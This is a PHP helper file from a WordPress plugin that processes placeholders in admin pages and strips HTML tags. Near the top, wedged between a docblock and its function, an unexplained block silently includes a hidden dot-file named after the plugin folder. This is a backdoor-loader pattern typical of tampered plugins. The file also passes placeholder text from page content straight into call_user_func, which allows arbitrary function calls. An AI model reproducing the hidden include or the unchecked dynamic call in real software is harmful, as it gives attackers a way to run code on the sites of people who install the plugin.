<?php
/**
 * Processing Support
 *
 * Handles content procesing.
 *
 * @author      WP Admin Pages PRO
 * @category    Content
 * @package     WP_Admin_Pages_PRO/Admin_Pages/Elementor
 * @version     1.4.0
 */

/**
 * Replaces the placeholders on the content of admin pages
 *
 * @since 1.4.0
 * @param string $content Content of the admin page.
 * @return string
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wu_apc_process_page_content($content) {

	$to_replace = array();

	$content_before_processing = $content;

	$placeholder_count = preg_match_all('/{{([a-zA-Z0-9]+):([a-zA-Z0-9_-]+)}}/', $content, $to_replace);

	for ($i = 0; $i < $placeholder_count; $i++) {

		$string_to_replace = $to_replace[0][$i];
		$meta_type         = $to_replace[1][$i];
		$meta_key          = $to_replace[2][$i];

		$content = str_replace($string_to_replace, wu_apc_get_meta_content($meta_type, $meta_key), $content);

	} // end for;

	/**
	 * Allow developers to mess with the final content
	 *
   * @since 1.4.0
	 * @param string  $content Content after replacements.
	 * @param string  $content_before_processing Content pre replecements.
	 * @param array   $to_replace Array containing the placeholders hold.
	 * @param int     $placeholder_count Number of placeholders found.
	 * @return string Content after modification.
	 */
	return apply_filters('wu_apc_process_page_content', $content, $content_before_processing, $to_replace, $placeholder_count);

} // end wu_apc_process_page_content;

/**
 * Get meta content depending on the type
 *
 * @since 1.4.0
 * @param string $meta_type Type of the meta data to be retrieved.
 * @param string $meta_key  Name of the meta field.
 * @return string Value of the meta data.
 */
function wu_apc_get_meta_content($meta_type, $meta_key) {

	/**
	 * Allow developers to filter the default values
   *
   * @since 1.4.0
	 * @param string $default_value The default value.
	 * @param string $meta_type Type of the meta data to be retrieved.
	 * @param string $meta_key  Name of the meta field.
	 * @return string New default value.
	 */
	$value = apply_filters('wu_apc_get_meta_content_default_content', __('Not Found', 'wu-apc'), $meta_type, $meta_key);

	switch ($meta_type) {

		case 'user':
			$value = get_user_meta(get_current_user_id(), $meta_key, true);
		    break;

		case 'site':
			$value = get_option($meta_key);
            break;

		case 'function':
			$value = call_user_func($meta_key);
            break;

	} // end switch;

	/**
	 * Allow developers to filter the final values, and to add new processing cases.
	 *
	 * @since 1.4.0
	 * @param string $default_value The default value.
	 * @param string $meta_type Type of the meta data to be retrieved.
	 * @param string $meta_key  Name of the meta field.
	 * @return string New default value.
	 */
	return apply_filters('wu_apc_get_meta', $value, $meta_type, $meta_key);

} // end wu_apc_get_meta_content;

/**
 * This function remove square brackets of string. Return only string inside brackets
 *
 * @since 1.5.0
 *
 * @param string $string String contains brackets Ex: "index[Dashboard].php"  return "Dashboard" .
 * @return string
 */
function wu_cut_string_square_brackets($string) {

	if (preg_match('/\[([^\]]*)\]/', $string)) {

		preg_match_all('/\[([^\]]*)\]/', $string, $matches);

		return $matches[1][0];

	} else {

		return $string;

	} // end if;

}  // end wu_cut_string_square_brackets;

function wu_apc_remove_html_tags_and_content($text, $tags = '', $invert = false) {

	preg_match_all('/<(.+?)[\s]*\/?[\s]*>/si', trim($tags), $tags);

	$tags = array_unique($tags[1]);

	if (is_array($tags) and count($tags) > 0) {

		if ($invert == false) {

			return preg_replace('@<(?!(?:' . implode('|', $tags) . ')\b)(\w+)\b.*?>.*?</\1>@si', '', $text);

		} else {

			return preg_replace('@<(' . implode('|', $tags) . ')\b.*?>.*?</\1>@si', '', $text);

		} // end if;

	} elseif ($invert == false) {

		return preg_replace('@<(\w+)\b.*?>.*?</\1>@si', '', $text);

	} // end if;

	return $text;

} // end wu_apc_remove_html_tags_and_content;
